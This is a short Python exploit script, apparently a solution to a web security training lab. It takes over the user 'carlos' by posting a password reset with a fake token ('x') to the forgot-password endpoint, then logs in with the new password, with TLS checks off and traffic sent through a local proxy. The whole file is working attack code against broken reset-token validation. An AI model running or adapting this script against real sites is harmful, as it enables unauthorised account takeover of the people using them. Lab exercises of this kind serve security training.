import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def access_carlos_account(s, url):
    
    # reset Carlos' account
    print("[+] Resetting Carlos' account...")
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=x"
    password_reset_data = { # structure of data is in POST request of forgot-password?temp-forgot-password-token=<TOKEN>
        "temp-forgot-password-token": "x",
        "username": "carlos",
        "new-password-1": "password",
        "new-password-2": "password"
    }
    r = s.post(password_reset_url, verify=False, proxies=proxies, data=password_reset_data)

    # access Carlos' account
    print("[+] Logging into Carlos' account...")

    login_url = url + "/login"
    login_data = { # structure of data is in POST request of /login
        "username": "carlos",
        "password": "password"
    }
    r = s.post(login_url, verify=False, proxies=proxies, data=login_data)

    # confirm exploit worked; check if logged in
    if "Log out" in r.text:
        print("[+] Successfully logged into Carlos' account!")
    else:
        print("[-] Failed to login to Carlos' account :(")
        exit(-1)

def main():
    # verify script parameters
    if len(sys.argv) != 2:
        print('[+] Usage: %s "<url>"' % sys.argv[0])
        print('[+] Example: %s "www.example.com"' % sys.argv[0])
        exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()